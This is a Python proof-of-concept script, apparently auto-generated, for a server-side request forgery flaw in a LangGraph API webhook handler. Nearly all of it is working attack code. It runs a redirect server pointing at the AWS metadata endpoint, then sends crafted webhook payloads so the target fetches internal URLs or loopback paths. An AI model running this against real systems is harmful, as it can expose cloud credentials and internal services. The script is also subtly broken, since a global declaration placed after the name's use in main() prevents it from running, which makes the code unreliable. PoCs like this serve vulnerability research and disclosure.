#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-027
# Sink: ssrf_safe_async_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_ssrf_safe_async_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src webhook handler.

Vulnerability: The webhook URL is user-controlled and validated, but the HTTP client
follows redirects without re-validating the target. An attacker can host a redirect
from a public domain to an internal IP (e.g., 169.254.169.254) or use a path starting
with '/' to access internal endpoints via the loopback client.

This PoC demonstrates both attack vectors:
1. External redirect: Host a public URL that redirects to an internal metadata endpoint
2. Internal path: Use a path starting with '/' to access local resources

Requirements: Python 3.6+, requests library (pip install requests)
"""

import argparse
import sys
import time
import json
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000"  # The langgraph API endpoint
WEBHOOK_ENDPOINT = "/webhook"  # Endpoint that accepts webhook URLs
INTERNAL_TARGET = "http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint
LOCAL_TARGET = "/internal/api/config"  # Example internal path

class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that returns a redirect to an internal IP."""
    
    def do_GET(self):
        """Handle GET requests by redirecting to internal target."""
        self.send_response(302)
        self.send_header('Location', INTERNAL_TARGET)
        self.end_headers()
    
    def do_POST(self):
        """Handle POST requests by redirecting to internal target."""
        self.send_response(302)
        self.send_header('Location', INTERNAL_TARGET)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

def start_redirect_server(port=9999):
    """Start a simple HTTP server that redirects to internal IP."""
    server = HTTPServer(('0.0.0.0', port), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server started on port {port}")
    print(f"[*] Will redirect to: {INTERNAL_TARGET}")
    return server

def exploit_external_redirect(target_url, redirect_port=9999):
    """
    Exploit SSRF via external redirect.
    
    This creates a redirect server that responds with a 302 redirect to an internal IP.
    The langgraph webhook client will follow this redirect without re-validating.
    """
    print("\n[*] Attempting SSRF via external redirect...")
    
    # Start redirect server
    redirect_server = start_redirect_server(redirect_port)
    
    # The webhook URL points to our redirect server
    webhook_url = f"http://{socket.gethostname()}:{redirect_port}/redirect"
    
    # Prepare the payload
    payload = {
        "webhook": webhook_url,
        "run": {
            "run_id": "test-ssrf-redirect-001",
            "run_type": "test"
        },
        "status": "completed",
        "checkpoint": None,
        "exception": None,
        "run_started_at": time.time(),
        "run_ended_at": time.time()
    }
    
    try:
        import requests
        response = requests.post(
            f"{target_url}{WEBHOOK_ENDPOINT}",
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[!] SSRF via redirect likely successful!")
            print(f"[!] Check if {INTERNAL_TARGET} was accessed")
        else:
            print("[-] Request failed or was blocked")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        redirect_server.shutdown()

def exploit_internal_path(target_url):
    """
    Exploit SSRF via internal path starting with '/'.
    
    If the webhook URL starts with '/', the code uses a loopback client.
    This could allow access to internal endpoints on localhost.
    """
    print("\n[*] Attempting SSRF via internal path...")
    
    # The webhook URL is a path starting with '/'
    webhook_url = LOCAL_TARGET
    
    # Prepare the payload
    payload = {
        "webhook": webhook_url,
        "run": {
            "run_id": "test-ssrf-path-001",
            "run_type": "test"
        },
        "status": "completed",
        "checkpoint": None,
        "exception": None,
        "run_started_at": time.time(),
        "run_ended_at": time.time()
    }
    
    try:
        import requests
        response = requests.post(
            f"{target_url}{WEBHOOK_ENDPOINT}",
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print(f"[!] SSRF via internal path likely successful!")
            print(f"[!] Check if {LOCAL_TARGET} was accessed on localhost")
        else:
            print("[-] Request failed or was blocked")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

def check_vulnerability(target_url):
    """
    Check if the target endpoint is accessible and potentially vulnerable.
    """
    print(f"[*] Checking target: {target_url}")
    
    try:
        import requests
        # Test basic connectivity
        response = requests.get(target_url, timeout=5)
        print(f"[*] Target is reachable (status: {response.status_code})")
        
        # Check if webhook endpoint exists
        test_payload = {
            "webhook": "http://example.com/test",
            "run": {"run_id": "test"},
            "status": "completed",
            "checkpoint": None,
            "exception": None,
            "run_started_at": time.time(),
            "run_ended_at": time.time()
        }
        
        response = requests.post(
            f"{target_url}{WEBHOOK_ENDPOINT}",
            json=test_payload,
            timeout=5
        )
        print(f"[*] Webhook endpoint responds (status: {response.status_code})")
        return True
        
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot connect to {target_url}")
        return False
    except Exception as e:
        print(f"[-] Error checking target: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for SSRF via redirect bypass in langgraph_api_src"
    )
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "--redirect-port",
        type=int,
        default=9999,
        help="Port for redirect server (default: 9999)"
    )
    parser.add_argument(
        "--internal-path",
        default=LOCAL_TARGET,
        help=f"Internal path to test (default: {LOCAL_TARGET})"
    )
    parser.add_argument(
        "--mode",
        choices=["redirect", "path", "both"],
        default="both",
        help="Attack mode (default: both)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF via Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print(f"\nTarget: {args.target}")
    print(f"Mode: {args.mode}")
    
    # Check if target is reachable
    if not check_vulnerability(args.target):
        print("\n[-] Target is not reachable. Exiting.")
        sys.exit(1)
    
    # Execute exploits based on mode
    if args.mode in ["redirect", "both"]:
        exploit_external_redirect(args.target, args.redirect_port)
    
    if args.mode in ["path", "both"]:
        # Update global LOCAL_TARGET with user-specified path
        global LOCAL_TARGET
        LOCAL_TARGET = args.internal_path
        exploit_internal_path(args.target)
    
    print("\n[*] PoC completed. Check the target logs for evidence of SSRF.")

if __name__ == "__main__":
    main()
